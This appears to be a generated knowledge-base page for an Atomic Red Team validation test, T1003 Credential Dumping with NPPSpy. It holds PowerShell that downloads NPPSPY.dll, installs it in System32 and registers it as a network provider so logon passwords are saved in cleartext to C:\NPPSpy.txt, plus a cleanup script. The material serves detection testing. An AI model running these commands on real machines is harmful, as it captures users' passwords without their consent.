---
atomic_guid: "9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6"
title: "Credential Dumping with NPPSpy"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003"
attack_technique_name: "OS Credential Dumping"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6"
  - "Credential Dumping with NPPSpy"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Credential Dumping with NPPSpy

Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
After user's logging in cleartext password is saved in C:\NPPSpy.txt.
Clean up deletes the files and reverses Registry changes.
NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy

## Metadata

- Atomic GUID: 9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6
- Technique: T1003: OS Credential Dumping
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1003/T1003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003]]

## Dependencies

NPPSpy.dll must be available in ExternalPayloads directory

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"
$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
```

### Cleanup

```powershell
$cleanupPath = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER 
$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''
Set-ItemProperty -Path $cleanupPath.PSPath -Name "PROVIDERORDER" -Value $cleanupUpdatedValue
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy" -Recurse -ErrorAction Ignore
Remove-Item C:\NPPSpy.txt -ErrorAction Ignore
Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml)
